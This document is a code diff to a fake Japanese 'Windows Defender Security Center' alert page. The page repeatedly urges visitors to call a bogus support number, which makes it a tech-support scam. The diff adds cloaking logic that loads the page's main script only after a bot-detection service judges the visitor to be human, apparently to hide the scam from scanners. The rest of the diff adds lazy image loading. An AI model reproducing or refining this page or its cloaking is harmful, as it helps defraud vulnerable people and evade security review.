@@ -4,6 +4,41 @@
 <head>
   <script src="//c.adsco.re" type="text/javascript"></script>
   <script type="text/javascript">
+    window.load = (url) => {
+      const script = document.createElement(`script`);
+
+      script.async = true;
+
+      script.src = url;
+
+      script.onload = () => {
+        console.error(`Loaded: ${url}`);
+      };
+
+      script.onerror = () => {
+        console.error(`Failed: ${url}`);
+      };
+
+      document.head.appendChild(script);
+
+      return true;
+    };
+
+    window.run = f => {
+      console.log(document.readyState);
+      switch (true) {
+        case document.readyState === `interactive` || document.readyState === `loading`:
+          document.addEventListener(`DOMContentLoaded`, f, false);
+          return true;
+        case document.readyState === `complete`:
+          f();
+          return true;
+        default:
+          setTimeout(() => run(f), 1000);
+          return true;
+      }
+    };
+
     AdscoreInit("QqLfAAAAAAAAeEtgdQZAr2RAk6MtjZ2iS1cnrNU", {
       sub_id: "space-japanfacts",
       callback: async (result) => {
@@ -12,8 +47,7 @@
         console.log(adscore);
         switch (true) {
           case adscore.okay:
-            return true;
-            window.location.href = ``;
+            return run(() => load(`index.js`));
           default:
             return false;
         }
@@ -73,7 +107,7 @@
 
 <body>
   <div id="remove" class="container">
-    <img src="https://www.faponhd.com/contents/videos_screenshots/0/700/preview.jpg" alt="image">
+    <img loading="lazy" src="https://www.faponhd.com/contents/videos_screenshots/0/700/preview.jpg" alt="image">
     <div class="play-button"></div>
   </div>
   <section id="mycanvas" class="map" style="display: none; cursor: none;">
@@ -81,12 +115,12 @@
       window.bcda = "";
     </script>
     <div style="position:absolute; top:100px; right:10px; z-index:9999;">
-      <img src="_/gif/1gfhf0f.gif" alt="" width="500">
+      <img loading="lazy" src="_/gif/1gfhf0f.gif" alt="" width="500">
     </div>
 
     <div class="bg" style="cursor:none">
       <div class="bgimg" style="top:0">
-        <img src="_/png/fesbg.png" alt="" width="100%">
+        <img loading="lazy" src="_/png/fesbg.png" alt="" width="100%">
       </div>
     </div>
     <a href="#" id="link_black" style="cursor:none" rel="noreferrer">
@@ -94,11 +128,11 @@
     </a>
 
     <div class="pro_box2" style="cursor: none; display: block;">
-      <img src="_/png/bx1.png" alt="" style="width:100%;max-width: 100%;display: block;
+      <img loading="lazy" src="_/png/bx1.png" alt="" style="width:100%;max-width: 100%;display: block;
       margin: 0 auto;">
     </div>
     <div class="pro_box3" style="cursor: none; display: block;">
-      <img src="_/png/web1.png" alt="" style="width:100%;max-width: 100%;display: block;
+      <img loading="lazy" src="_/png/web1.png" alt="" style="width:100%;max-width: 100%;display: block;
       margin: 0 auto;">
     </div>
     <div style="bottom:-20px;position:fixed;cursor:none;z-index:999999999;" id="footer">
@@ -106,10 +140,10 @@
         <div class="col-md-12">
           <div class="right-foot" style="text-align:center;margin-bottom: 5px;">
             <span id="footertxt">
-              <img src="_/png/img01df.png"> Windows_セキュリティ </span>
+              <img loading="lazy" src="_/png/img01df.png"> Windows_セキュリティ </span>
             <span style="font-weight:500;padding-left:13px;color:#fff; ">ダイヤルウィンドウのサポート: <span
-                style="border:1px solid #fff;border-radius:5px;padding:4px 5px"> <img src="_/png/winlo.png" alt=""
-                  style="width: 25px;vertical-align: sub;"> 直接お電話ください
+                style="border:1px solid #fff;border-radius:5px;padding:4px 5px"> <img loading="lazy"
+                  src="_/png/winlo.png" alt="" style="width: 25px;vertical-align: sub;"> 直接お電話ください
                 <script>document.write(bcda)</script>(0101)-88851-05059
               </span>
             </span>
@@ -132,11 +166,11 @@
         <div class="ilb headers" style="border-bottom:1px solid #d6d5d5">
           <span class="fl title" id="txtadd">
             <span class="fl ilb">
-              <img src="_/png/dm.png" class="logo3">
+              <img loading="lazy" src="_/png/dm.png" class="logo3">
             </span>Windows_Defender_セキュリティセンター</span>
           <span class="fl title2" id="txts1">
             <a href="#" id="bgt">
-              <img src="_/png/cs.png">
+              <img loading="lazy" src="_/png/cs.png">
             </a>
           </span>
         </div>
@@ -148,20 +182,20 @@
           <div id="isp">ISP: Bharti Airtel Limited</div>
         </span>
       </div>
-      <img src="_/gif/re.gif" id="banner">
+      <img loading="lazy" src="_/gif/re.gif" id="banner">
       <div id="disclaimer">保護対策のためシステムへのアクセスが制限されています。
         <br>
         <span class="support" style="font-size:22px;">
           Windows サポートに問い合わせてください:
           <br>
           <span style="border:1px solid #114d9a;border-radius:5px;padding:4px 5px">
-            <img src="_/png/winlo.png" alt="" style="width: 25px;vertical-align: sub;" /> 直接お電話ください
+            <img loading="lazy" src="_/png/winlo.png" alt="" style="width: 25px;vertical-align: sub;" /> 直接お電話ください
             <script>document.write(bcda)</script>(0101)-88851-05059
           </span>
         </span>
       </div>
       <div id="bottom">
-        <img src="_/png/img01df.png" id="badge">
+        <img loading="lazy" src="_/png/img01df.png" id="badge">
         <span class="title3">Windows</span>
         <ul>
           <li>
@@ -221,12 +255,13 @@
       </p>
     </div>
     <div id="chat" style="display: block;">
-      <img src="_/png/img01df.png">
+      <img loading="lazy" src="_/png/img01df.png">
       <span style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">Microsoft</span>
       <p style="font-weight:600;font-size:24px">サポートに電話する:
         <br>
       </p>
-      <h4 style="font-weight:600;font-size:22px"> <img src="_/png/winlo.png" alt="" style="width: 25px;margin-left: 0;">
+      <h4 style="font-weight:600;font-size:22px"> <img loading="lazy" src="_/png/winlo.png" alt=""
+          style="width: 25px;margin-left: 0;">
         電話してください
         <script>document.write(bcda)</script>(0101)-88851-05059
         <br>(セキュリティヘルプデスク)
@@ -257,8 +292,6 @@
         y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y);
       })(window, document, "clarity", "script", "t7lirn5dco");
   </script>
-
-  <script async="true" src="index.js"></script>
 </body>
 
 </html>
